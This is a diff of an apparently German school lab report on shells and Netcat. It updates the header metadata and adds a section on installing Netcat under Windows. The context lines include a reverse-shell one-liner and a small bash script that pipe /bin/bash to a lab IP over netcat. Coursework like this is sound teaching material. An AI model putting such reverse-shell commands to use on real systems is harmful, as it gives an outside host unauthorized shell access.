@@ -2,16 +2,16 @@
 
 # **Titel: Shells**
 
-| **AufgabenNr:** | 9 |
+| **AufgabenNr:** | 10 |
 |---|:---|
 | **Klasse:** | 3BHIF |
 | **Name:** | Benjamin Friedl |
 | **Gruppe:** | 2 |
-| **Abgabetermin:** | 16.2.2024 |
-| **Abgabedatum:** | 30.2.2024 |
+| **Abgabetermin:** | 07.04.2024 |
+| **Abgabedatum:** | 08.04.2024 |
 
 ## **Kurzbeschreibung:** 
-Übung 6 wiederholen und diesmal die VM des Hackers bearbeiten, damit sie die Paktete nicht blockt.
+In diesem Protokoll wird auf die verschiedenen Shells und deren Funktionsweise eingegangen. Außerdem werden verschiedene Befehle und deren Verwendung erklärt. Abschließend wird auf das Tool Netcat eingegangen und dessen Verwendungsmöglichkeiten aufgezeigt.
 
 ---
 \
@@ -50,7 +50,7 @@
     1. [Chat-Tool](#chat-tool)
     2. [File-Transfer-Tool](#file-transfer-tool)
     3. [Shellzugriff](#shellzugriff)
-\
+    4. [Netcat unter Windows](#netcat-unter-windows)
 \
 \
 \
@@ -249,3 +249,11 @@ nc 10.140.0.3 3333 -e /bin/bash
 #!/bin/bash
 nc 10.140.0.3 3333 -e /bin/bash
 ```
+
+## Netcat unter Windows
+- Netcat ist auch unter Windows verfügbar aber nicht standardmäßig installiert
+- Download: https://eternallybored.org/misc/netcat/
+- Installation: `nc.exe` in `C:\Windows\System32` kopieren
+- Es gibt auch eine GUI-Version von Netcat: https://sourceforge.net/projects/nc110/
+- GUI-Version ist einfacher zu bedienen, aber weniger flexibel
+- GUI-Version kann auch für Port-Scanning, Port-Forwarding, etc. verwendet werden
